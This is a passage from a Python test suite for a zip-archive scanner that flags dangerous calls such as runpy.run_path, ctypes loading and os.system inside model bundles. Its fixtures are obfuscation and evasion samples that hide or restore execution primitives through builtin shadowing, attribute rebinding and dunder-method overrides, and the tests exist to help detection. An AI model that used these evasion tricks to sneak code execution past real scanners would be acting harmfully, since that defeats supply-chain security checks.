        "import builtins\n"
        "import runpy\n"
        "real_dict = builtins.dict\n"
        "original = runpy.run_path\n"
        "runpy.run_path = len\n"
        "class Safe:\n"
        "    @staticmethod\n"
        "    def update(*args, **kwargs):\n"
        "        pass\n"
        "builtins.dict = Safe\n"
        "builtins.dict = real_dict\n"
        "builtins.dict.update(runpy.__dict__, run_path=original)\n"
        "runpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


@pytest.mark.parametrize(
    ("shadow", "restore"),
    [
        ("dict = Safe\n", "dict.update"),
        ("import builtins\n    builtins.dict = Safe\n", "builtins.dict.update"),
    ],
)
def test_scan_zip_preserves_canonical_dict_descriptor_after_conditional_shadow(
    tmp_path: Path, shadow: str, restore: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\n"
        "original = runpy.run_path\n"
        "runpy.run_path = len\n"
        "class Safe:\n"
        "    @staticmethod\n"
        "    def update(*args, **kwargs):\n"
        "        pass\n"
        "if globals().get('enabled'):\n"
        f"    {shadow}"
        f"{restore}(runpy.__dict__, run_path=original)\n"
        "runpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


def test_scan_zip_preserves_runpy_execution_after_import_rebinds_module(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "class Dummy:\n    pass\nrunpy = Dummy()\nrunpy.run_path = len\nimport runpy\nrunpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


def test_scan_zip_clears_imported_static_members_after_alias_rebind(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "class Safe:\n    run_path = len\nimport runpy as rp\nrp = Safe()\nrp.run_path([])\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_preserves_safe_module_member_overwrite_after_reimport(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy as rp\nrp.run_path = len\nimport runpy as rp\nrp.run_path([])\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_preserves_safe_module_member_overwrite_after_alias_reimport(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy as rp\nrp.run_path = print\nrp = object()\nimport runpy as rp\nrp.run_path('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_preserves_safe_module_member_overwrite_after_same_name_reimport(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy\nrunpy.run_path = print\nrunpy = object()\nimport runpy\nrunpy.run_path('safe')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_does_not_apply_unexecuted_member_write_to_reimport(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy as rp\n"
        "def never_called():\n"
        "    rp.run_path = print\n"
        "import runpy as mod\n"
        "mod.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_preserves_runpy_member_after_harmless_reimport(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy as rp\nimport runpy as rp\nrp.run_path('payload.py')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


@pytest.mark.parametrize("rebinding", ["rp = rp", "rp = runpy"])
def test_scan_zip_preserves_runpy_member_after_module_preserving_alias_assignment(
    tmp_path: Path, rebinding: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = f"import runpy\nimport runpy as rp\n{rebinding}\nrp.run_path('payload.py')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    python_checks = [
        check
        for check in result.checks
        if check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED
    ]
    assert len(python_checks) == 1
    assert python_checks[0].rule_code == "S108"
    assert python_checks[0].details["reason"] == "high-risk calls: runpy.run_path"


def test_scan_zip_preserves_safe_runpy_overwrite_before_conditional(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import runpy\nrunpy.run_path = len\nif replace:\n    runpy.run_path = str\nrunpy.run_path([])\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "from ctypes import CDLL as load\nload = len\nload([])\n",
        "import ctypes\nctypes.CDLL = len\nctypes.CDLL([])\n",
        "from webbrowser import open as launch\nlaunch = len\nlaunch([])\n",
        "import webbrowser\nwebbrowser.open = len\nwebbrowser.open([])\n",
    ],
)
def test_scan_zip_allows_shadowed_direct_python_member_primitives(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert result.success is True
    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.__dict__['getcwd']()\n",
        "import os\ngetattr(object, '__getattribute__')(os, 'getcwd')()\n",
        "import os\nnamespace = os.__dict__\nnamespace['runner'] = print\nnamespace['runner']('safe')\n",
        (
            "import os\nnamespace = os.__dict__\nnamespace['runner'] = os.system\n"
            "namespace['runner'] = print\nnamespace['runner']('safe')\n"
        ),
        (
            "import os\nclass Safe:\n    system = print\nnamespace = globals()\n"
            "namespace['os'] = Safe\nnamespace['os'].system('safe')\n"
        ),
        (
            "import os\nclass Safe:\n    system = print\nnamespace = locals()\n"
            "namespace['os'] = Safe\nnamespace['os'].system('safe')\n"
        ),
        (
            "import os\nclass Safe:\n    system = print\nnamespace = vars()\n"
            "namespace['os'] = Safe\nnamespace['os'].system('safe')\n"
        ),
        ("import os\nclass Safe:\n    system = print\nclass Replace:\n    globals()['os'] = Safe\nos.system('safe')\n"),
        (
            "import os\nclass Safe:\n    system = print\ndef run():\n"
            "    globals()['os'] = Safe\n    globals()['os'].system('safe')\nrun()\n"
        ),
        (
            "import os\nclass Safe:\n    system = print\ndef run():\n"
            "    globals()['os'] = Safe\n    os.system('safe')\nrun()\n"
        ),
        "import os\nos.__dict__['_safe'] = print\nos.__dict__.get('_safe', os.system)('safe')\n",
        "import os\nos.__dict__['_safe'] = print\nos.__dict__.pop('_safe', os.system)('safe')\n",
        "import os\nos.__dict__['_safe'] = print\nos.__dict__.setdefault('_safe', os.system)('safe')\n",
        "import os\nrunner = print\nglobals().setdefault('runner', os.system)\nrunner('safe')\n",
        "import os\nglobals()['runner'] = os.system\nglobals().pop('runner')\nrunner('safe')\n",
        "import os\nos.__dict__['runner'] = os.system\nos.__dict__.pop('runner')\nos.runner('safe')\n",
        ("import os\nrunner = os.system\nif True:\n    globals()['runner'] = print\nglobals()['runner']('safe')\n"),
        "import runpy\nrunpy.run_path = len\nrunpy.run_path([])\n",
        "import webbrowser\nwebbrowser.get = len\nwebbrowser.get([]).open('https://example.invalid')\n",
        "import webbrowser\nbrowser = webbrowser.get()\nbrowser.open = len\nbrowser.open([])\n",
        "import ctypes\nctypes.cdll = len\nctypes.cdll['msvcrt'].printf(b'x')\n",
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nloader.payload.printf(b'x')\n",
        (
            "import ctypes\nfirst = ctypes.LibraryLoader(len)\nsecond = ctypes.LibraryLoader(len)\n"
            "first.payload = ctypes.CDLL\nsecond.payload.printf(b'x')\n"
        ),
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nloader.label = 'debug'\nloader.payload.printf(b'x')\n",
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nloader.label = object()\nloader.payload\n",
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nloader.cache = dict()\nloader.payload\n",
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nloader['payload']\nloader.LoadLibrary('payload')\n",
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nif loader:\n    pass\nloader.payload\n",
        (
            "import ctypes\nimport runpy\nrunpy.run_path = print\n"
            "def restore(self):\n"
            "    runpy.run_path = len\n"
            "    return iter(())\n"
            "ctypes.LibraryLoader.__iter__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nif loader:\n    pass\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nrunpy.run_path = print\n"
            "def restore(self):\n"
            "    runpy.run_path = len\n"
            "    return True\n"
            "ctypes.LibraryLoader.__bool__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nfor item in loader:\n    pass\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nloader = ctypes.LibraryLoader(len)\nrunpy.run_path = print\n"
            "def restore(self, name, value):\n"
            "    runpy.run_path = len\n"
            "ctypes.LibraryLoader.__setattr__ = restore\n"
            "loader._dlltype\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nloader = ctypes.LibraryLoader(len)\nrunpy.run_path = print\n"
            + "del loader._dlltype\nloader._dlltype\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nloader = ctypes.LibraryLoader(len)\n"
            "loader.label = object()\nrunpy.run_path = print\n"
            "def restore(self, name):\n"
            "    runpy.run_path = len\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "loader.label\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nloader = ctypes.LibraryLoader(len)\n"
            "loader.__dict__['label'] = object()\nrunpy.run_path = print\n"
            "def restore(self, name):\n"
            "    runpy.run_path = len\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "loader.label\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nloader = ctypes.LibraryLoader(len)\nloader.label = object()\n"
            "runpy.run_path = print\n"
            "def restore(self, name):\n"
            "    runpy.run_path = len\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "getattr(loader, 'label')\nhasattr(loader, 'label')\nrunpy.run_path('safe')\n"
        ),
        (
            "import ctypes\nimport runpy\nloader = ctypes.LibraryLoader(len)\nrunpy.run_path = print\n"
            "def restore(self, name, value):\n"
            "    runpy.run_path = len\n"
            "ctypes.LibraryLoader.__setattr__ = restore\n"
            "getattr(loader, '_dlltype')\nrunpy.run_path('safe')\n"
        ),
        "import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL, object)\nloader.payload.printf(b'x')\n",
        "import ctypes\nloader = ctypes.LibraryLoader(loader=ctypes.CDLL)\nloader.payload.printf(b'x')\n",
        "import ctypes\nload = ctypes.cdll.LoadLibrary\nname = load.__name__\n",
        "import ctypes\nname = ctypes.LibraryLoader.payload\n",
        "import ctypes\nctypes.LibraryLoader = len\nctypes.LibraryLoader(ctypes.CDLL).payload\n",
        "import ctypes\nctypes.windll.kernel32 = len\ngetattr(ctypes.windll, 'kernel32')\n",
        "import ctypes\ngetattr(object=ctypes.cdll, name='msvcrt')\n",
        "import ctypes\nctypes.cdll.__getattribute__('msvcrt')\n",
        "import ctypes\nobject.__getattribute__(ctypes.cdll, 'msvcrt')\n",
        "import ctypes\nctypes.windll.kernel32 = len\nctypes.windll.kernel32\n",
        "import safe as runpy\nrunpy.run_path = runpy.run_module\nrunpy.run_path('payload')\n",
        "import ctypes\nsetattr(ctypes.windll, 'kernel32', len)\nctypes.windll.kernel32\n",
        (
            "import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            "setattr(loader, 'payload', len)\nloader.payload([])\n"
        ),
        ("import webbrowser\nbrowser = webbrowser.get()\nsetattr(browser, 'open', len)\nbrowser.open([])\n"),
        (
            "import ctypes\nclass SafeNestedCDLL(ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        def later() -> None:\n"
            "            ctypes.CDLL.__init__(self, name)\n"
            "ctypes.LibraryLoader(SafeNestedCDLL).payload\nSafeNestedCDLL('/missing')\n"
        ),
        "import os\nos.__getattr__('system')('id')\n",
        "import builtins\nbuiltins.__getattr__('eval')('1')\n",
        "import webbrowser\nbrowser = webbrowser.get()\nother = browser\nbrowser.open = len\nother.open([])\n",
        (
            "import webbrowser\nbrowser = webbrowser.get()\nother = browser\n"
            "browser.open = len\nbrowser = webbrowser.get()\nother.open([])\n"
        ),
        (
            "import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            "other = loader\nloader.payload = len\nother.payload([])\n"
        ),
        (
            "import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            "other = loader\nloader.payload = len\nloader = ctypes.LibraryLoader(ctypes.CDLL)\nother.payload([])\n"
        ),
        (
            "import ctypes\nclass SafeCDLL(ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        pass\n"
            "ctypes.LibraryLoader(SafeCDLL).payload\nSafeCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass Safe:\n"
            "    def __init__(self, name: str) -> None:\n"
            "        self.name = name\n"
            "class NoLoad(Safe, ctypes.CDLL):\n"
            "    pass\n"
            "ctypes.LibraryLoader(NoLoad).payload\nNoLoad('/missing')\n"
        ),
        (
            "import ctypes\nclass Safe:\n"
            "    def __init__(self, name: str) -> None:\n"
            "        self.name = name\n"
            "class NoLoad(Safe, ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        super().__init__(name)\n"
            "ctypes.LibraryLoader(NoLoad).payload\nNoLoad('/missing')\n"
        ),
        (
            "import ctypes\nclass MissingNameSuperCDLL(ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        super().__init__()\n"
            "ctypes.LibraryLoader(MissingNameSuperCDLL).payload\nMissingNameSuperCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass DeadDelegateCDLL(ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        if False:\n"
            "            ctypes.CDLL.__init__(self, name)\n"
            "ctypes.LibraryLoader(DeadDelegateCDLL).payload\nDeadDelegateCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass InstanceShadowCDLL(ctypes.CDLL):\n"
            "    init = ctypes.CDLL.__init__\n"
            "    def __init__(self, name: str) -> None:\n"
            "        self.init = lambda name: None\n"
            "        self.init(name)\n"
            "ctypes.LibraryLoader(InstanceShadowCDLL).payload\nInstanceShadowCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass NewSkipsInitCDLL(ctypes.CDLL):\n"
            "    def __new__(cls, name: str):\n"
            "        return object()\n"
            "ctypes.LibraryLoader(NewSkipsInitCDLL).payload\nNewSkipsInitCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass InvalidDirectCDLL(ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        ctypes.CDLL.__init__(object(), name)\n"
            "ctypes.LibraryLoader(InvalidDirectCDLL).payload\nInvalidDirectCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass AsyncInitCDLL(ctypes.CDLL):\n"
            "    async def __init__(self, name: str) -> None:\n"
            "        ctypes.CDLL.__init__(self, name)\n"
            "ctypes.LibraryLoader(AsyncInitCDLL).payload\nAsyncInitCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass SafeQualifiedRebindCDLL(ctypes.CDLL):\n"
            "    init = ctypes.CDLL.__init__\n"
            "    def __init__(self, name: str) -> None:\n"
            "        SafeQualifiedRebindCDLL.init = lambda self, name: None\n"
            "        SafeQualifiedRebindCDLL.init(self, name)\n"
            "ctypes.LibraryLoader(SafeQualifiedRebindCDLL).payload\nSafeQualifiedRebindCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass SafeLocalClassAliasRebindCDLL(ctypes.CDLL):\n"
            "    init = ctypes.CDLL.__init__\n"
            "    def __init__(self, name: str) -> None:\n"
            "        cls = SafeLocalClassAliasRebindCDLL\n"
            "        cls.init = lambda self, name: None\n"
            "        cls.init(self, name)\n"
            "ctypes.LibraryLoader(SafeLocalClassAliasRebindCDLL).payload\n"
            "SafeLocalClassAliasRebindCDLL('/missing')\n"
        ),
        (
            "import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            "loader.LoadLibrary = len\nloader.LoadLibrary([])\n"
            "loader.__getitem__ = len\nloader.__getitem__([])\n"
            "loader.__getattr__ = len\nloader.__getattr__('payload')\n"
        ),
        ("import ctypes\nloader = ctypes.LibraryLoader(ctypes.CDLL)\ndel loader.payload\nloader.payload\n"),
        (
            "import ctypes\nfrom builtins import staticmethod as sm\n"
            "class StaticAliasCDLL(ctypes.CDLL):\n"
            "    @sm\n"
            "    def __init__(name: str) -> None:\n"
            "        ctypes.CDLL.__init__(name)\n"
            "ctypes.LibraryLoader(StaticAliasCDLL).payload\nStaticAliasCDLL('/missing')\n"
        ),
        (
            "import builtins as b\nimport ctypes\n"
            "class ClassAliasCDLL(ctypes.CDLL):\n"
            "    @b.classmethod\n"
            "    def __init__(cls, name: str) -> None:\n"
            "        ctypes.CDLL.__init__(cls, name)\n"
            "ctypes.LibraryLoader(ClassAliasCDLL).payload\nClassAliasCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass SafeCDLL(ctypes.CDLL):\n"
            "    init = ctypes.CDLL.__init__\n"
            "    def init(self, name: str) -> None:\n"
            "        pass\n"
            "    def __init__(self, name: str) -> None:\n"
            "        self.init(name)\n"
            "ctypes.LibraryLoader(SafeCDLL).payload\nSafeCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass SafeNestedCDLL(ctypes.CDLL):\n"
            "    def __init__(self, name: str) -> None:\n"
            "        def later() -> None:\n"
            "            ctypes.CDLL.__init__(self, name)\n"
            "ctypes.LibraryLoader(SafeNestedCDLL).payload\nSafeNestedCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass SafeShadowCDLL(ctypes.CDLL):\n"
            "    init = ctypes.CDLL.__init__\n"
            "    def __init__(self, name: str) -> None:\n"
            "        self.init = lambda name: None\n"
            "        self.init(name)\n"
            "ctypes.LibraryLoader(SafeShadowCDLL).payload\nSafeShadowCDLL('/missing')\n"
        ),
        (
            "import ctypes\nclass SafeNewCDLL(ctypes.CDLL):\n"
            "    def __new__(cls, name: str):\n"
            "        return object()\n"
            "ctypes.LibraryLoader(SafeNewCDLL).payload\nSafeNewCDLL('/missing')\n"
        ),
        (
            "import ctypes\nimport webbrowser\n"
            "setattr(ctypes.windll, 'kernel32', len)\nctypes.windll.kernel32\n"
            "loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            "setattr(loader, 'payload', len)\nloader.payload([])\n"
            "browser = webbrowser.get()\n"
            "setattr(browser, 'open', len)\nbrowser.open([])\n"
        ),
    ],
)
def test_scan_zip_ignores_benign_namespace_mapping_call(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_flags_inert_libraryloader_dlltype_mapping_rebound(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import ctypes\nloader = ctypes.LibraryLoader(len)\nloader.__dict__['_dlltype'] = ctypes.CDLL\nloader.payload\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("source", "rule_code"),
    [
        (
            "import builtins\nimport runpy\n"
            "original = runpy.run_path\nbuiltins.len = original\n"
            "runpy.run_path = len\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import builtins\nimport ctypes\n"
            "original = ctypes.CDLL\nbuiltins.len = original\n"
            "loader = ctypes.LibraryLoader(len)\nloader.payload\n",
            "S110",
        ),
        (
            "import ctypes\nloader = ctypes.LibraryLoader(len)\n"
            "loader.__setattr__('_dlltype', ctypes.CDLL)\nloader.payload\n",
            "S110",
        ),
        (
            "import ctypes\nloader = ctypes.LibraryLoader(len)\n"
            "loader.__setattr__.__call__('_dlltype', ctypes.CDLL)\nloader.payload\n",
            "S110",
        ),
        (
            "import ctypes as c\nimport webbrowser as wb\nwb = c.cdll\nwb.open = wb.open\n",
            "S110",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, name, value):\n"
            "    if name == 'label':\n"
            "        runpy.run_path = original\n"
            "    object.__setattr__(self, name, value)\n"
            "ctypes.LibraryLoader.__setattr__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nloader.label = object()\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, name, value):\n"
            "    if name == '_dlltype':\n"
            "        runpy.run_path = original\n"
            "    object.__setattr__(self, name, value)\n"
            "ctypes.LibraryLoader.__setattr__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, dlltype):\n"
            "    runpy.run_path = original\n"
            "    object.__setattr__(self, '_dlltype', dlltype)\n"
            "ctypes.LibraryLoader.__init__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(cls, dlltype):\n"
            "    runpy.run_path = original\n"
            "    return object.__new__(cls)\n"
            "ctypes.LibraryLoader.__new__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len(name)\n"
            "ctypes.LibraryLoader.__getattr__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nloader.payload\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len(name)\n"
            "ctypes.LibraryLoader.__getattribute__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nloader.payload\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len(name)\n"
            "ctypes.LibraryLoader.__getitem__ = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nloader['payload']\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def intercept(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len(name)\n"
            "ctypes.LibraryLoader.LoadLibrary = intercept\n"
            "loader = ctypes.LibraryLoader(len)\nloader.LoadLibrary('payload')\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self, name):\n"
            "    runpy.run_path = original\n"
            "ctypes.LibraryLoader.__delattr__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\ndel loader.marker\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self, key, value):\n"
            "    runpy.run_path = original\n"
            "ctypes.LibraryLoader.__setitem__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nloader['marker'] = 1\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self, key):\n"
            "    runpy.run_path = original\n"
            "ctypes.LibraryLoader.__delitem__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\ndel loader['marker']\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self):\n"
            "    runpy.run_path = original\n"
            "    return True\n"
            "ctypes.LibraryLoader.__bool__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nif loader:\n    pass\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self):\n"
            "    runpy.run_path = original\n"
            "    return iter(())\n"
            "ctypes.LibraryLoader.__iter__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nfor item in loader:\n    pass\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self, key):\n"
            "    runpy.run_path = original\n"
            "    raise IndexError\n"
            "ctypes.LibraryLoader.__getitem__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nfor item in loader:\n    pass\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self):\n"
            "    runpy.run_path = original\n"
            "ctypes.LibraryLoader.__call__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nloader()\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "def restore(self, *args, **kwargs):\n"
            "    runpy.run_path = original\n"
            "    return object\n"
            "ctypes.LibraryLoader.__call__ = restore\n"
            "loader = ctypes.LibraryLoader(len)\nclass Trigger(metaclass=loader):\n    pass\n"
            "runpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "loader = ctypes.LibraryLoader(len)\ndel loader._dlltype\n"
            "def restore(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "loader._dlltype\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "loader = ctypes.LibraryLoader(len)\ndelattr(loader, '_dlltype')\n"
            "def restore(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "loader._dlltype\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
            "loader = ctypes.LibraryLoader(len)\nloader.__dict__.pop('_dlltype')\n"
            "def restore(self, name):\n"
            "    runpy.run_path = original\n"
            "    return len\n"
            "ctypes.LibraryLoader.__getattr__ = restore\n"
            "loader._dlltype\nrunpy.run_path('payload.py')\n",
            "S108",
        ),
        (
            "import ctypes\nimport runpy\noriginal = runpy.run_path\nrunpy.run_path = print\n"
